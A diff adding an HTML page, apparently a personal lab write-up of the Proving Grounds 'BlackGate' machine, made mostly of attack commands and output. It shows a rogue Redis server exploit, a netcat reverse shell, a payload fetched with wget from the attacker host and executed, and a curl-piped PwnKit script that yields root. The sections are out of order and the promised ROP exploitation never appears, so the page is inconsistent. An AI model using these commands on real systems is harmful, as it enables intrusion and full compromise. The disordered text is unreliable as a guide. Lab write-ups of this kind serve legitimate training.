@@ -1,0 +1,189 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab demonstrates leveraging an insecure Redis service to gain initial shell access by deploying a rogue server exploit for remote code execution. Privilege escalation is achieved by exploiting a vulnerable redis-status binary using Return Oriented Programming (ROP) to bypass protections and execute arbitrary commands as root. This lab emphasizes exploiting service misconfigurations, binary reverse engineering, and advanced ROP chain development for privilege escalation."><title>Proving Grounds: BlackGate</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: BlackGate</h1><p>This lab demonstrates leveraging an insecure Redis service to gain initial shell access by deploying a rogue server exploit for remote code execution. Privilege escalation is achieved by exploiting a vulnerable redis-status binary using Return Oriented Programming (ROP) to bypass protections and execute arbitrary commands as root. This lab emphasizes exploiting service misconfigurations, binary reverse engineering, and advanced ROP chain development for privilege escalation.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>Initial access to the target will be obtained through a Redis service. Privilege escalation will then be achieved by exploiting a binary on the target using Return Oriented Programming (ROP). This lab focuses on exploiting service vulnerabilities and advanced exploitation techniques.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab demonstrates leveraging an insecure Redis service to gain initial shell access by deploying a rogue server exploit for remote code execution. Privilege escalation is achieved by exploiting a vulnerable redis-status binary using Return Oriented Programming (ROP) to bypass protections and execute arbitrary commands as root. This lab emphasizes exploiting service misconfigurations, binary reverse engineering, and advanced ROP chain development for privilege escalation.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate open services to identify the Redis server and its configuration.</li>
+<li>Deploy a rogue Redis server exploit to gain initial access and establish a reverse shell.</li>
+<li>Analyze the redis-status binary to identify a buffer overflow vulnerability.</li>
+<li>Develop a ROP chain to exploit the buffer overflow and execute commands as root.</li>
+<li>Leverage the ROP chain to gain root access and validate control over the target system.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+strings /usr/local/bin/redis-status
+...
+Authorization Key: 
+ClimbingParrotKickingDonkey321
+...</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+## and then run !/bin/bash and we get root shell</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>──(kali㉿kali)-[~/offsec/blackgate]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sS -Pn -T5 -p- 192.168.160.176
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 21:16 -0400
+Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 44.53% done; ETC: 21:16 (0:00:10 remaining)
+Nmap scan report for 192.168.160.176
+Host is up (0.024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6379/tcp open  redis</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/blackgate]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sCV -p 22,6379 192.168.160.176
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 21:17 -0400
+Nmap scan report for 192.168.160.176
+Host is up (0.022s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
+|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
+|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
+6379/tcp open  redis   Redis key-value store 4.0.14
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><ul>
+<li>Using <code>https://github.com/jas502n/Redis-RCE</code> we get a shell but it is very unstable</li>
+<li>trying this <code>https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de---------------------------------------</code>, However this is also very unstable so we created msfvenom exploit and uploaded it quickly before it kicks us out</li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/blackgate]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 445 
+listening on [any] 445 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.160.176] 33696
+# Inspect the directory for files relevant to the next step.
+
+ls
+exp_lin.so
+netplan_gsmmd4ly
+netplan_r5keftzm
+pshell
+snap.lxd
+systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-logind.service-E3XCQi
+systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-resolved.service-rc6Owj
+systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-timesyncd.service-hwr48e
+vmware-root_709-4248287236
+# Run the helper or analysis script used in this lab step.
+
+python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+/bin/sh: 2: python: not found
+/bin/bash -i
+bash: cannot set terminal process group (875): Inappropriate ioctl for device
+bash: no job control in this shell
+# Confirm the identity of the current session.
+
+prudence@blackgate:/tmp$ whoami
+# Confirm the identity of the current session.
+
+whoami
+prudence
+prudence@blackgate:/tmp$</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/blackgate]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 445
+listening on [any] 445 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.160.176] 45230
+/bin/bash -i
+bash: cannot set terminal process group (875): Inappropriate ioctl for device
+bash: no job control in this shell
+# Execute the next evidence-gathering step in the authorized lab.
+
+prudence@blackgate:/tmp$ sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)&quot;
+&lt;.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)&quot;
+id
+uid=0(root) gid=0(root) groups=0(root),1001(prudence)
+# Read the file contents for useful configuration or credential data.
+
+cat /root/proof.txt
+aba171612649458dcc943875930231f7</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ ./redis-rogue-server.py --rhost 192.168.160.176 --rport 6379 --lhost 192.168.45.205 --exp=../Redis-RCE/exp_lin.so         
+/home/kali/offsec/blackgate/redis-rogue-server/./redis-rogue-server.py:11: SyntaxWarning: invalid escape sequence &#39;\ &#39;
+  | ___ \       | (_)     | ___ \                       /  ___|
+______         _ _      ______                         _____                          
+| ___ \       | (_)     | ___ \                       /  ___|                         
+| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
+|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ &#39;__\ \ / / _ \ &#39;__|
+| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
+\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
+                                     __/ |                                            
+                                    |___/                                             
+@copyright n0b0dy @ r3kapig
+
+[info] TARGET 192.168.160.176:6379
+[info] SERVER 192.168.45.205:21000
+[info] Setting master...
+[info] Setting dbfilename...
+[info] Loading module...
+[info] Temerory cleaning up...
+What do u want, [i]nteractive shell or [r]everse shell: i
+[info] Interact mode start, enter &quot;exit&quot; to quit.
+[\&lt;&lt;] ls
+[&gt;&gt;] exp_lin.so
+[&gt;&gt;] netplan_gsmmd4ly
+[&gt;&gt;] netplan_r5keftzm
+[&gt;&gt;] snap.lxd
+[&gt;&gt;] systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-logind.service-E3XCQi
+[&gt;&gt;] systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-resolved.service-rc6Owj
+[&gt;&gt;] systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-timesyncd.service-hwr48e
+[&gt;&gt;] vmware-root_709-4248287236
+[\&lt;&lt;] pwd
+[&gt;&gt;] /tmp
+[\&lt;&lt;] wget http://192.168.45.205/pshell
+[\&lt;&lt;] ls
+[&gt;&gt;] exp_lin.so
+[&gt;&gt;] netplan_gsmmd4ly
+[&gt;&gt;] netplan_r5keftzm
+[&gt;&gt;] pshell
+[&gt;&gt;] snap.lxd
+[&gt;&gt;] systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-logind.service-E3XCQi
+[&gt;&gt;] systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-resolved.service-rc6Owj
+[&gt;&gt;] systemd-private-ef3a04592d7c4db883e6d63804840ea2-systemd-timesyncd.service-hwr48e
+[&gt;&gt;] vmware-root_709-4248287236
+[\&lt;&lt;] chmod +x pshell
+[\&lt;&lt;] ./pshell</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Identify commands that can run with elevated privileges.
+
+prudence@blackgate:/tmp$ sudo -l
+# Identify commands that can run with elevated privileges.
+
+sudo -l
+Matching Defaults entries for prudence on blackgate:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User prudence may run the following commands on blackgate:
+    (root) NOPASSWD: /usr/local/bin/redis-status</code></pre><ul>
+<li>However, we were not able to run anything as it gave authrorization error</li>
+<li>inspecting the contents of <code>/usr/local/bin/redis-status</code></li>
+</ul>
+<h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
